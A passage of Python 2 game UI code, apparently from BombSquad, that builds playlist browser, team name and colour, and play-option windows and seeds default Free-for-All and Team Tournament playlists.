            label=bs.Lstr(
                resource='editText', fallbackResource=self._r + '.editText'))
        self._lockImages.append(bs.imageWidget(parent=self._rootWidget,
                                               size=(30, 30),
                                               drawController=b,
                                               position=(h-10, v+58.0*s - 28),
                                               texture=lockTex))

        v -= 65.0*s
        duplicateButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(90, 58.0 * s),
            onActivateCall=self._duplicatePlaylist, color=bColor,
            autoSelect=True, textColor=bTextColor, buttonType='square',
            textScale=0.7, label=bs.Lstr(
                resource='duplicateText', fallbackResource=self._r +
                '.duplicateText'))
        self._lockImages.append(bs.imageWidget(parent=self._rootWidget,
                                               size=(30, 30),
                                               drawController=b,
                                               position=(h-10, v+58.0*s - 28),
                                               texture=lockTex))

        v -= 65.0*s
        deleteButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(90, 58.0 * s),
            onActivateCall=self._deletePlaylist, color=bColor, autoSelect=True,
            textColor=bTextColor, buttonType='square', textScale=0.7,
            label=bs.Lstr(
                resource='deleteText',
                fallbackResource=self._r + '.deleteText'))
        self._lockImages.append(bs.imageWidget(parent=self._rootWidget,
                                               size=(30, 30),
                                               drawController=b,
                                               position=(h-10, v+58.0*s - 28),
                                               texture=lockTex))
        v -= 65.0*s
        self._importButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(90, 58.0 * s),
            onActivateCall=self._importPlaylist, color=bColor, autoSelect=True,
            textColor=bTextColor, buttonType='square', textScale=0.7,
            label=bs.Lstr(resource='importText'))
        v -= 65.0*s
        shareButton = b = bs.buttonWidget(parent=self._rootWidget,
                                          position=(h, v), size=(90, 58.0*s),
                                          onActivateCall=self._sharePlaylist,
                                          color=bColor,
                                          autoSelect=True,
                                          textColor=bTextColor,
                                          buttonType='square',
                                          textScale=0.7,
                                          label=bs.Lstr(resource='shareText'))
        self._lockImages.append(bs.imageWidget(parent=self._rootWidget,
                                               size=(30, 30),
                                               drawController=b,
                                               position=(h-10, v+58.0*s - 28),
                                               texture=lockTex))

        v = self._height - 75
        self._scrollHeight = self._height - 119
        scrollWidget = bs.scrollWidget(
            parent=self._rootWidget,
            position=(140 + xInset, v - self._scrollHeight),
            size=(self._width - (180 + 2 * xInset),
                  self._scrollHeight + 10),
            highlight=False)
        bs.widget(edit=backButton, rightWidget=scrollWidget)
        c = self._columnWidget = bs.columnWidget(parent=scrollWidget)

        h = 145
        v = self._height - self._scrollHeight - 109

        try:
            self._doRandomizeVal = bs.getConfig()[
                self._configName + ' Playlist Randomize']
        except Exception:
            self._doRandomizeVal = 0

        h += 210

        for b in [newButton, deleteButton, editButton, duplicateButton]:
            bs.widget(edit=b, rightWidget=scrollWidget)
        bs.widget(
            edit=scrollWidget, leftWidget=newButton,
            rightWidget=bsInternal._getSpecialWidget('partyButton')
            if gToolbars else None)

        # make sure config exists
        self._configNameFull = self._configName+' Playlists'

        if self._configNameFull not in bs.getConfig():
            bs.getConfig()[self._configNameFull] = {}

        self._selectedPlaylist = None
        self._selectedPlaylistIndex = None
        self._playlistWidgets = []

        self._refresh(selectPlaylist=selectPlaylist)

        bs.buttonWidget(edit=backButton, onActivateCall=self._back)
        bs.containerWidget(edit=self._rootWidget, cancelButton=backButton)

        bs.containerWidget(edit=self._rootWidget, selectedChild=scrollWidget)

        # keep our lock images up to date/etc.
        self._updateTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            timeType='real', repeat=True)
        self._update()

    def _update(self):
        haveProOptions = bsUtils._haveProOptions()
        for lock in self._lockImages:
            bs.imageWidget(edit=lock, opacity=0.0 if haveProOptions else 1.0)

    def _back(self):
        if self._selectedPlaylist is not None:
            bs.getConfig()[
                self._configName+' Playlist Selection'] = self._selectedPlaylist
            bs.writeConfig()

        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        uiGlobals['mainMenuWindow'] = TeamsWindow(
            transition='inLeft', sessionType=self._sessionType).getRootWidget()

    def _select(self, name, index):
        self._selectedPlaylist = name
        self._selectedPlaylistIndex = index

    def _runSelectedPlaylist(self):
        bsInternal._unlockAllInput()
        try:
            bsInternal._newHostSession(self._sessionType)
        except Exception:
            import bsMainMenu
            bs.printException("exception running session", self._sessionType)
            # drop back into a main menu session..
            bsInternal._newHostSession(bsMainMenu.MainMenuSession)

    def _choosePlaylist(self):

        if self._selectedPlaylist is None:
            return
        self._savePlaylistSelection()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')

        bsInternal._fadeScreen(
            False, time=250, endCall=self._runSelectedPlaylist)
        bsInternal._lockAllInput()

    def _refresh(self, selectPlaylist=None):
        oldSelection = self._selectedPlaylist

        # if there was no prev selection, look in prefs
        if oldSelection is None:
            try:
                oldSelection = bs.getConfig()[
                    self._configName + ' Playlist Selection']
            except Exception:
                pass

        oldSelectionIndex = self._selectedPlaylistIndex

        # delete old
        while len(self._playlistWidgets) > 0:
            self._playlistWidgets.pop().delete()

        items = bs.getConfig()[self._configNameFull].items()

        # make sure everything is unicode now
        items = [(i[0].decode('utf-8'), i[1]) if type(i[0])
                 is not unicode else i for i in items]

        items.sort(key=lambda x: x[0].lower())

        items = [[u'__default__', None]] + items  # default is always first
        index = 0
        for pName, p in items:
            w = bs.textWidget(parent=self._columnWidget,
                              size=(self._width - 40, 30),
                              maxWidth=self._width - 110,
                              text=self._getPlaylistDisplayName(pName),
                              hAlign='left', vAlign='center',
                              color=(0.6, 0.6, 0.7, 1.0)
                              if pName == u'__default__'
                              else(0.85, 0.85, 0.85, 1), alwaysHighlight=True,
                              onSelectCall=bs.Call(
                                  self._select, pName, index),
                              onActivateCall=bs.Call(
                                  self._editButton.activate),
                              selectable=True)
            bs.widget(edit=w, showBufferTop=50, showBufferBottom=50)
            # hitting up from top widget shoud jump to 'back;
            if index == 0:
                bs.widget(edit=w, upWidget=self._backButton)

            self._playlistWidgets.append(w)
            # select this one if the user requested it
            if selectPlaylist is not None:
                if pName == selectPlaylist:
                    bs.columnWidget(
                        edit=self._columnWidget, selectedChild=w,
                        visibleChild=w)
            else:
                # select this one if it was previously selected
                if oldSelectionIndex is not None:  # go by index if there's one
                    if index == oldSelectionIndex:
                        bs.columnWidget(
                            edit=self._columnWidget, selectedChild=w,
                            visibleChild=w)
                else:  # otherwise look by name
                    if pName == oldSelection:
                        bs.columnWidget(
                            edit=self._columnWidget, selectedChild=w,
                            visibleChild=w)

            index += 1

    def _savePlaylistSelection(self):
        # store the selected playlist in prefs..
        # this serves dual purposes of letting us re-select it next time
        # if we want and also lets us pass it to the game (since we reset
        # the whole python environment thats not actually easy)
        bs.getConfig()[
            self._configName + ' Playlist Selection'] = self._selectedPlaylist
        bs.getConfig()[
            self._configName + ' Playlist Randomize'] = self._doRandomizeVal
        bs.writeConfig()

    def _newPlaylist(self):

        if not bsUtils._haveProOptions():
            PurchaseWindow(items=['pro'])
            return

        # clamp at our max playlist number
        if len(bs.getConfig()[self._configNameFull]) > self._maxPlaylists:
            bs.screenMessage(
                bs.Lstr(
                    translate=('serverResponses',
                               'Max number of playlists reached.')),
                color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return

        # in case they cancel so we can return to this state..
        self._savePlaylistSelection()
        GameListEditSession(sessionType=self._sessionType)
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')

    def _editPlaylist(self):
        if not bsUtils._haveProOptions():
            PurchaseWindow(items=['pro'])
            return

        if self._selectedPlaylist is None:
            return
        if self._selectedPlaylist == '__default__':
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(bs.Lstr(resource=self._r+'.cantEditDefaultText'))
            return
        self._savePlaylistSelection()
        GameListEditSession(
            existingPlaylist=self._selectedPlaylist,
            sessionType=self._sessionType)
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')

    def _doDeletePlaylist(self):
        bsInternal._addTransaction({'type': 'REMOVE_PLAYLIST',
                                    'playlistType': self._configName,
                                    'playlistName': self._selectedPlaylist})
        bsInternal._runTransactions()

        bs.playSound(bs.getSound('shieldDown'))

        # (we don't use len()-1 here because the default list adds one)
        if self._selectedPlaylistIndex > len(
                bs.getConfig()[self._configName + ' Playlists']):
            self._selectedPlaylistIndex = len(
                bs.getConfig()[self._configName+' Playlists'])
        self._refresh()

    def _importPlaylist(self):
        import bsUI2
        # gotta be signed in for this to work..
        if bsInternal._getAccountState() != 'SIGNED_IN':
            bs.screenMessage(
                bs.Lstr(resource='notSignedInErrorText'),
                color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return

        bsUI2.SharePlaylistImportWindow(
            originWidget=self._importButton, onSuccessCallback=bs.WeakCall(
                self._onPlaylistImportSuccess))

    def _onPlaylistImportSuccess(self):
        self._refresh()

    def _onSharePlaylistResponse(self, name, response):
        import bsUI2
        if response is None:
            bs.screenMessage(
                bs.Lstr(resource='internal.unavailableNoConnectionText'),
                color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return
        bsUI2.SharePlaylistResultsWindow(name, response)

    def _sharePlaylist(self):
        if not bsUtils._haveProOptions():
            PurchaseWindow(items=['pro'])
            return
        # gotta be signed in for this to work..
        if bsInternal._getAccountState() != 'SIGNED_IN':
            bs.screenMessage(
                bs.Lstr(resource='notSignedInErrorText'),
                color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return
        if self._selectedPlaylist == '__default__':
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(
                bs.Lstr(resource=self._r + '.cantShareDefaultText'),
                color=(1, 0, 0))
            return

        if self._selectedPlaylist is None:
            return

        bsInternal._addTransaction(
            {'type': 'SHARE_PLAYLIST', 'expireTime': time.time() + 5,
             'playlistType': self._configName,
             'playlistName': self._selectedPlaylist},
            callback=bs.WeakCall(
                self._onSharePlaylistResponse, self._selectedPlaylist))
        bsInternal._runTransactions()
        bs.screenMessage(bs.Lstr(resource='sharingText'))

    def _deletePlaylist(self):
        if not bsUtils._haveProOptions():
            PurchaseWindow(items=['pro'])
            return

        if self._selectedPlaylist is None:
            return
        if self._selectedPlaylist == '__default__':
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(bs.Lstr(resource=self._r+'.cantDeleteDefaultText'))
        else:
            ConfirmWindow(
                bs.Lstr(
                    resource=self._r + '.deleteConfirmText',
                    subs=[('${LIST}', self._selectedPlaylist)]),
                self._doDeletePlaylist, 450, 150)

    def _getPlaylistDisplayName(self, playlist):
        if playlist == '__default__':
            return self._defaultListName
        else:
            return playlist if type(playlist) is bs.Lstr else bs.Lstr(
                value=playlist)

    def _duplicatePlaylist(self):
        if not bsUtils._haveProOptions():
            PurchaseWindow(items=['pro'])
            return

        if self._selectedPlaylist is None:
            return
        if self._selectedPlaylist == '__default__':
            pl = self._getDefaultListCall()
        else:
            pl = bs.getConfig()[
                self._configNameFull].get(
                self._selectedPlaylist)
            if pl is None:
                bs.playSound(bs.getSound('error'))
                return

        # clamp at our max playlist number
        if len(bs.getConfig()[self._configNameFull]) > self._maxPlaylists:
            bs.screenMessage(
                bs.Lstr(
                    translate=('serverResponses',
                               'Max number of playlists reached.')),
                color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return

        copyText = bs.Lstr(resource='copyOfText').evaluate()
        # get just 'Copy' or whatnot
        copyWord = copyText.replace('${NAME}', '').strip()
        # find a valid dup name that doesn't exist

        testIndex = 1
        baseName = self._getPlaylistDisplayName(
            self._selectedPlaylist).evaluate()

        # if it looks like a copy, strip digits and spaces off the end
        if copyWord in baseName:
            while baseName[-1].isdigit() or baseName[-1] == ' ':
                baseName = baseName[:-1]
        while True:
            if copyWord in baseName:
                testName = baseName
            else:
                testName = copyText.replace('${NAME}', baseName)
            if testIndex > 1:
                testName += ' '+str(testIndex)
            if not testName in bs.getConfig()[self._configNameFull]:
                break
            testIndex += 1

        bsInternal._addTransaction({'type': 'ADD_PLAYLIST',
                                    'playlistType': self._configName,
                                    'playlistName': testName,
                                    'playlist': copy.deepcopy(pl)})
        bsInternal._runTransactions()

        bs.playSound(bs.getSound('gunCocking'))
        self._refresh(selectPlaylist=testName)


class TeamNamesColorsWindow(PopupWindow):

    def __init__(self, transition='inScale', scaleOrigin=None):

        import bsTeamGame

        self._width = 500
        self._height = 330
        self._transitioningOut = False
        self._maxNameLength = 16

        # creates our _rootWidget
        scale = 1.69 if gSmallUI else 1.1 if gMedUI else 0.85
        PopupWindow.__init__(self, position=scaleOrigin, size=(
            self._width, self._height), scale=scale)

        bsConfig = bs.getConfig()
        self._names = list(bsConfig.get(
            'Custom Team Names', bsTeamGame.gDefaultTeamNames))
        # we need to flatten the translation since it will be an editable string
        self._names = [bs.Lstr(translate=('teamNames', n)).evaluate()
                       for n in self._names]
        self._colors = list(bsConfig.get(
            'Custom Team Colors', bsTeamGame.gDefaultTeamColors))

        self._colorButtons = []
        self._colorTextFields = []

        bs.buttonWidget(
            parent=self._rootWidget, label=bs.Lstr(
                resource='settingsWindowAdvanced.resetText'),
            autoSelect=True, scale=0.7, onActivateCall=self._reset,
            size=(120, 50),
            position=(self._width * 0.5 - 60 * 0.7, self._height - 60))

        for i in range(2):
            self._colorButtons.append(
                bs.buttonWidget(
                    parent=self._rootWidget, autoSelect=True,
                    position=(50, 0 + 195 - 90 * i),
                    onActivateCall=bs.Call(self._colorClick, i),
                    size=(70, 70),
                    color=self._colors[i],
                    label='', buttonType='square'))
            self._colorTextFields.append(bs.textWidget(
                parent=self._rootWidget,
                position=(135, 0 + 201 - 90 * i),
                size=(280, 46),
                text=self._names[i],
                hAlign="left", vAlign="center",
                maxChars=self._maxNameLength,
                color=self._colors[i],
                description=bs.Lstr(
                    resource='nameText'),
                editable=True, padding=4))
        bs.buttonWidget(
            parent=self._rootWidget, label=bs.Lstr(resource='cancelText'),
            autoSelect=True, onActivateCall=self._onCancelPress, size=(150, 50),
            position=(self._width * 0.5 - 200, 20))
        bs.buttonWidget(
            parent=self._rootWidget, label=bs.Lstr(resource='saveText'),
            autoSelect=True, onActivateCall=self._save, size=(150, 50),
            position=(self._width * 0.5 + 50, 20))

        bs.containerWidget(edit=self._rootWidget,
                           selectedChild=self._colorButtons[0])

        self._update()

    def _colorClick(self, i):
        ColorPicker(
            parent=self._rootWidget,
            position=self._colorButtons[i].getScreenSpaceCenter(),
            offset=(270.0, 0),
            initialColor=self._colors[i],
            delegate=self, tag=i)

    def colorPickerClosing(self, picker):
        pass

    def colorPickerSelectedColor(self, picker, color):
        self._colors[picker.getTag()] = color
        self._update()

    def _reset(self):
        import bsTeamGame
        for i in range(2):
            self._colors[i] = bsTeamGame.gDefaultTeamColors[i]
            name = bs.Lstr(translate=(
                'teamNames', bsTeamGame.gDefaultTeamNames[i])).evaluate()
            if len(name) > self._maxNameLength:
                print 'GOT DEFAULT TEAM NAME LONGER THAN MAX LENGTH'
            bs.textWidget(edit=self._colorTextFields[i], text=name)
        self._update()

    def _update(self):
        for i in range(2):
            bs.buttonWidget(edit=self._colorButtons[i], color=self._colors[i])
            bs.textWidget(edit=self._colorTextFields[i], color=self._colors[i])

    def _save(self):

        import bsTeamGame
        bsConfig = bs.getConfig()

        # First, determine whether the values here are defaults, in which case
        # we can clear any values from prefs.  Currently if the string matches
        # either the default raw value or its translation we consider it default.
        # (the fact that team names get translated makes this situation a bit
        # sloppy)
        newNames = []
        isDefault = True
        for i in range(2):
            name = bs.textWidget(query=self._colorTextFields[i])
            if len(name) == 0:
                bs.screenMessage(
                    bs.Lstr(resource='nameNotEmptyText'),
                    color=(1, 0, 0))
                bs.playSound(bs.getSound('error'))
                return
            newNames.append(name)

        for i in range(2):
            if self._colors[i] != bsTeamGame.gDefaultTeamColors[i]:
                isDefault = False
            defaultTeamName = bsTeamGame.gDefaultTeamNames[i]
            defaultTeamNameTranslated = bs.Lstr(
                translate=('teamNames', defaultTeamName)).evaluate()
            if ((newNames[i] != defaultTeamName
                 and newNames[i] != defaultTeamNameTranslated)):
                isDefault = False

        if isDefault:
            for key in ('Custom Team Names', 'Custom Team Colors'):
                if key in bsConfig:
                    del bsConfig[key]
        else:
            bsConfig['Custom Team Names'] = tuple(newNames)
            bsConfig['Custom Team Colors'] = tuple(self._colors)

        bs.writeConfig()

        bs.playSound(bs.getSound('gunCocking'))
        self._transitionOut()

    def _transitionOut(self, transition='outScale'):
        if not self._transitioningOut:
            self._transitioningOut = True
            bs.containerWidget(edit=self._rootWidget, transition=transition)

    def onPopupCancel(self):
        bs.playSound(bs.getSound('swish'))
        self._transitionOut()

    def _onCancelPress(self):
        self._transitionOut()


class PlayOptionsWindow(PopupWindow):

    def __init__(self, sessionType, playlist, transition='inScale',
                 scaleOrigin=None, delegate=None):

        self._r = 'gameListWindow'
        self._delegate = delegate

        _setupPlaylistTypeVars(self, sessionType)

        self._transitioningOut = False

        try:
            self._doRandomizeVal = bs.getConfig()[
                self._configName + ' Playlist Randomize']
        except Exception:
            self._doRandomizeVal = 0

        self._sessionType = sessionType
        self._playlist = playlist

        self._width = 500
        self._height = 330-50

        # in teams games, show the custom names/colors button
        if self._sessionType is bs.TeamsSession:
            self._height += 50

        self._rowHeight = 45
        # grab our maps to display..
        modelOpaque = bs.getModel('levelSelectButtonOpaque')
        modelTransparent = bs.getModel('levelSelectButtonTransparent')
        maskTex = bs.getTexture('mapPreviewMask')
        # poke into this playlist and see if we can display some of its maps..
        mapTextures = []
        mapTextureEntries = []
        rows = 0
        columns = 0
        gameCount = 0
        sc = 0.35
        cWidthTotal = 0
        try:
            maxColumns = 5
            name = playlist
            if name == '__default__':
                if self._sessionType is bs.FreeForAllSession:
                    pl = bsUtils._getDefaultFreeForAllPlaylist()
                elif self._sessionType is bs.TeamsSession:
                    pl = bsUtils._getDefaultTeamsPlaylist()
                else:
                    raise Exception("unrecognized session-type: " +
                                    str(self._sessionType))
            else:
                try:
                    pl = bs.getConfig()[self._configName+' Playlists'][name]
                except Exception:
                    print 'ERROR INFO: self._configName is:', self._configName
                    print 'ERROR INFO: playlist names are:', bs.getConfig()[
                        self._configName + ' Playlists'].keys()
                    raise
            pl = bsUtils._filterPlaylist(
                pl, self._sessionType, removeUnOwned=False, markUnOwned=True)
            gameCount = len(pl)
            for entry in pl:
                m = entry['settings']['map']
                try:
                    mapType = bsMap.getMapClass(m)
                except Exception:
                    mapType = None
                if mapType is not None:
                    texName = mapType.getPreviewTextureName()
                    if texName is not None:
                        mapTextures.append(texName)
                        mapTextureEntries.append(entry)
            rows = (max(0, len(mapTextures)-1)/maxColumns)+1
            columns = min(maxColumns, len(mapTextures))

            if len(mapTextures) == 1:
                sc = 1.1
            elif len(mapTextures) == 2:
                sc = 0.7
            elif len(mapTextures) == 3:
                sc = 0.55
            else:
                sc = 0.35
            self._rowHeight = 128.0*sc
            cWidthTotal = sc*250.0*columns
            if len(mapTextures) > 0:
                self._height += self._rowHeight * rows

        except Exception:
            bs.printException("error listing playlist maps")

        showShuffleCheckBox = True if gameCount > 1 else False

        if showShuffleCheckBox:
            self._height += 40

        # creates our _rootWidget
        scale = 1.69 if gSmallUI else 1.1 if gMedUI else 0.85
        PopupWindow.__init__(self, position=scaleOrigin, size=(
            self._width, self._height), scale=scale)

        playlistName = (self._defaultListName if playlist == '__default__'
                        else playlist)
        self._titleText = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 89 + 51),
            size=(0, 0),
            text=playlistName, scale=1.4, color=(1, 1, 1),
            maxWidth=self._width * 0.7, hAlign="center", vAlign="center")

        self._cancelButton = bs.buttonWidget(
            parent=self._rootWidget, position=(25, self._height - 53),
            size=(50, 50),
            scale=0.7, label='', color=(0.42, 0.73, 0.2),
            onActivateCall=self._onCancelPress, autoSelect=True,
            icon=bs.getTexture('crossOut'),
            iconScale=1.2)

        hOffsImg = self._width*0.5-cWidthTotal*0.5
        vOffsImg = self._height - 118-sc*125.0+50
        bottomRowButtons = []
        self._haveAtLeastOneOwned = False
        for r in range(rows):
            for c in range(columns):
                texIndex = r*columns+c
                if texIndex < len(mapTextures):
                    texName = mapTextures[texIndex]
                    h = hOffsImg + sc * 250 * c
                    v = vOffsImg - self._rowHeight * r
                    entry = mapTextureEntries[texIndex]
                    owned = (
                        False if (
                            ('isUnOwnedMap' in entry and entry['isUnOwnedMap'])
                            or ('isUnOwnedGame' in entry
                                and entry['isUnOwnedGame']))
                        else True)

                    if owned:
                        self._haveAtLeastOneOwned = True

                    try:
                        desc = bsUtils.resolveTypeName(
                            entry['type']).getConfigDisplayString(entry)
                        if not owned:
                            desc = bs.Lstr(value='${DESC}\n${UNLOCK}', subs=[
                                ('${DESC}', desc), ('${UNLOCK}', bs.Lstr(
                                    resource='unlockThisInTheStoreText'))])
                        descColor = (0, 1, 0) if owned else (1, 0, 0)
                    except Exception:
                        desc = bs.Lstr(value='(invalid)')
                        descColor = (1, 0, 0)

                    b = bs.buttonWidget(
                        parent=self._rootWidget, size=(sc * 240.0, sc * 120.0),
                        position=(h, v),
                        texture=bs.getTexture(texName if owned else 'empty'),
                        modelOpaque=modelOpaque if owned else None,
                        onActivateCall=bs.Call(
                            bs.screenMessage, desc, color=descColor),
                        label='', color=(1, 1, 1),
                        autoSelect=True, extraTouchBorderScale=0.0,
                        modelTransparent=modelTransparent if owned else None,
                        maskTexture=maskTex if owned else None)
                    if r == 0 and c == 0:
                        bs.widget(edit=self._cancelButton, downWidget=b)
                    if r == rows-1:
                        bottomRowButtons.append(b)
                    if not owned:

                        # ewww; buttons dont currently have alpha so in this
                        # case we draw an image over our button with an empty
                        # texture on it
                        bs.imageWidget(
                            parent=self._rootWidget,
                            size=(sc * 260.0, sc * 130.0),
                            position=(h - 10.0 * sc, v - 4.0 * sc),
                            drawController=b, color=(1, 1, 1),
                            texture=bs.getTexture(texName),
                            modelOpaque=modelOpaque, opacity=0.25,
                            modelTransparent=modelTransparent,
                            maskTexture=maskTex)

                        bs.imageWidget(
                            parent=self._rootWidget, size=(sc * 100, sc * 100),
                            drawController=b,
                            position=(h + sc * 70, v + sc * 10),
                            texture=bs.getTexture('lock'))

        # team names/colors
        if self._sessionType is bs.TeamsSession:
            yOffs = 50 if showShuffleCheckBox else 0
            self._customColorsNamesButton = bs.buttonWidget(
                parent=self._rootWidget, position=(100, 200 + yOffs),
                size=(290, 35),
                onActivateCall=bs.WeakCall(self._customColorsNamesPress),
                autoSelect=True, textColor=(0.8, 0.8, 0.8),
                label=bs.Lstr(resource='teamNamesColorText'))
            if not bsUtils._havePro():
                bs.imageWidget(parent=self._rootWidget, size=(30, 30),
                               position=(95, 202+yOffs),
                               texture=bs.getTexture('lock'),
                               drawController=self._customColorsNamesButton)
        else:
            self._customColorsNamesButton = None

        # shuffle

        def _cbCallback(val):
            self._doRandomizeVal = val
            bs.getConfig()[
                self._configName + ' Playlist Randomize'] = self._doRandomizeVal
            bs.writeConfig()
        if showShuffleCheckBox:
            self._shuffleCheckBox = bs.checkBoxWidget(
                parent=self._rootWidget, position=(110, 200),
                scale=1.0, size=(250, 30),
                autoSelect=True, text=bs.Lstr(
                    resource=self._r + '.shuffleGameOrderText'),
                maxWidth=300, textColor=(0.8, 0.8, 0.8),
                value=self._doRandomizeVal, onValueChangeCall=_cbCallback)

        # show tutorial
        try:
            showTutorial = bs.getConfig()['Show Tutorial']
        except Exception:
            showTutorial = True

        def _cbCallback(val):
            bs.getConfig()['Show Tutorial'] = val
            bs.writeConfig()
        self._showTutorialCheckBox = cb = bs.checkBoxWidget(
            parent=self._rootWidget, position=(110, 151),
            scale=1.0, size=(250, 30),
            autoSelect=True, text=bs.Lstr(
                resource=self._r + '.showTutorialText'),
            maxWidth=300, textColor=(0.8, 0.8, 0.8),
            value=showTutorial, onValueChangeCall=_cbCallback)

        # grumble - current autoselect doesn't do a very good job with checkboxes
        if self._customColorsNamesButton is not None:
            for b in bottomRowButtons:
                bs.widget(edit=b, downWidget=self._customColorsNamesButton)
            if showShuffleCheckBox:
                bs.widget(edit=self._customColorsNamesButton,
                          downWidget=self._shuffleCheckBox)
                bs.widget(
                    edit=self._shuffleCheckBox,
                    upWidget=self._customColorsNamesButton)
            else:
                bs.widget(edit=self._customColorsNamesButton,
                          downWidget=self._showTutorialCheckBox)
                bs.widget(edit=self._showTutorialCheckBox,
                          upWidget=self._customColorsNamesButton)

        self._playButton = bs.buttonWidget(
            parent=self._rootWidget, position=(70, 44),
            size=(200, 45),
            scale=1.8, textResScale=1.5, onActivateCall=self._onPlayPress,
            autoSelect=True, label=bs.Lstr(resource='playText'))

        bs.widget(edit=self._playButton, upWidget=self._showTutorialCheckBox)

        bs.containerWidget(
            edit=self._rootWidget, startButton=self._playButton,
            cancelButton=self._cancelButton, selectedChild=self._playButton)

        # update now and once per second..
        self._updateTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            timeType='real', repeat=True)
        self._update()

    def _customColorsNamesPress(self):
        if not bsUtils._havePro():
            if bsInternal._getAccountState() != 'SIGNED_IN':
                showSignInPrompt()
            else:
                PurchaseWindow(items=['pro'])
            self._transitionOut()
            return
        TeamNamesColorsWindow(
            scaleOrigin=self._customColorsNamesButton.getScreenSpaceCenter())

    def _doesTargetPlaylistExist(self):
        if self._playlist == '__default__':
            return True
        try:
            return (self._playlist in
                    bs.getConfig()[self._configName+' Playlists'])
        except Exception:
            return False

    def _update(self):
        # all we do here is make sure our targeted playlist still exists..
        # and close ourself if not..
        if not self._doesTargetPlaylistExist():
            self._transitionOut()

    def _transitionOut(self, transition='outScale'):
        if not self._transitioningOut:
            self._transitioningOut = True
            bs.containerWidget(edit=self._rootWidget, transition=transition)

    def onPopupCancel(self):
        bs.playSound(bs.getSound('swish'))
        self._transitionOut()

    def _onCancelPress(self):
        self._transitionOut()

    def _onPlayPress(self):

        # disallow if our playlist has disappeared..
        if not self._doesTargetPlaylistExist():
            return

        # disallow if we have no unlocked games
        if not self._haveAtLeastOneOwned:
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(
                bs.Lstr(resource='playlistNoValidGamesErrorText'),
                color=(1, 0, 0))
            return

        bs.getConfig()[self._configName+' Playlist Selection'] = self._playlist
        bs.writeConfig()
        bsInternal._fadeScreen(
            False, time=250, endCall=self._runSelectedPlaylist)
        bsInternal._lockAllInput()
        self._transitionOut(transition='outLeft')
        if self._delegate is not None:
            self._delegate.onPlayOptionsWindowRunGame()

    def _runSelectedPlaylist(self):
        bsInternal._unlockAllInput()
        try:
            bsInternal._newHostSession(self._sessionType)
        except Exception:
            import bsMainMenu
            bs.printException("exception running session", self._sessionType)
            # drop back into a main menu session..
            bsInternal._newHostSession(bsMainMenu.MainMenuSession)


class TeamsWindow(Window):

    def __init__(self, sessionType, transition='inRight', originWidget=None):

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        global gMainWindow
        # store state for when we exit the next game..
        if issubclass(sessionType, bs.TeamsSession):
            gMainWindow = "Team Game Select"
            bsInternal._setAnalyticsScreen('Teams Window')
        elif issubclass(sessionType, bs.FreeForAllSession):
            gMainWindow = "Free-for-All Game Select"
            bsInternal._setAnalyticsScreen('FreeForAll Window')
        else:
            raise Exception('invalid sessionType: '+sessionType)
        _setupPlaylistTypeVars(self, sessionType)

        self._sessionType = sessionType

        # on new installations, lets go ahead and create a few playlists besides
        # the hard-coded default one:
        if not bsInternal._getAccountMiscVal('madeStandardPlaylists', False):
            bsInternal._addTransaction({
                'type': 'ADD_PLAYLIST',
                'playlistType': 'Free-for-All',
                'playlistName': bs.Lstr(resource='singleGamePlaylistNameText')
                .evaluate().replace('${GAME}', bs.Lstr(translate=(
                    'gameNames', 'Death Match')).evaluate()),
                'playlist': [{
                    'type': 'bsDeathMatch.DeathMatchGame',
                    'settings': {
                        'Epic Mode': False, 'Kills to Win Per Player': 10,
                        'Respawn Times': 1.0, 'Time Limit': 300,
                        'map': 'Doom Shroom'}
                },{
                    'type': 'bsDeathMatch.DeathMatchGame',
                    'settings': {
                        'Epic Mode': False, 'Kills to Win Per Player': 10,
                        'Respawn Times': 1.0, 'Time Limit': 300,
                        'map': 'Crag Castle'},
                }]})
            bsInternal._addTransaction(
                {'type': 'ADD_PLAYLIST', 'playlistType': 'Team Tournament',
                 'playlistName': bs.Lstr(
                     resource='singleGamePlaylistNameText').evaluate().replace(
                     '${GAME}', bs.Lstr(
                         translate=('gameNames',
                                    'Capture the Flag')).evaluate()),
                 'playlist':
                 [{'type': 'bsCaptureTheFlag.CTFGame',
                   'settings': {'map': 'Bridgit', 'Score to Win': 3,
                                'Flag Idle Return Time': 30,
                                'Flag Touch Return Time': 0,
                                'Respawn Times': 1.0, 'Time Limit': 600,
                                'Epic Mode': False}},
                  {'type': 'bsCaptureTheFlag.CTFGame',
                   'settings': {'map': 'Roundabout', 'Score to Win': 2,
                                'Flag Idle Return Time': 30,
                                'Flag Touch Return Time': 0,
                                'Respawn Times': 1.0, 'Time Limit': 600,
                                'Epic Mode': False}},
                  {'type': 'bsCaptureTheFlag.CTFGame',
                   'settings': {'map': 'Tip Top', 'Score to Win': 2,
                                'Flag Idle Return Time': 30,
                                'Flag Touch Return Time': 3,
                                'Respawn Times': 1.0, 'Time Limit': 300,
                                'Epic Mode': False}}]})
            bsInternal._addTransaction({
                'type': 'ADD_PLAYLIST',
                'playlistType': 'Team Tournament',
                'playlistName': bs.Lstr(translate=('playlistNames',
                                                   'Just Sports')).evaluate(),
                'playlist': [{'type': 'bsHockey.HockeyGame',
                              'settings': {'Time Limit': 0,
                                           'map': 'Hockey Stadium',
                                           'Score to Win': 1,
                                           'Respawn Times': 1.0}},
                             {'type': 'bsFootball.FootballTeamGame',
                              'settings': {'Time Limit': 0,
                                           'map': 'Football Stadium',
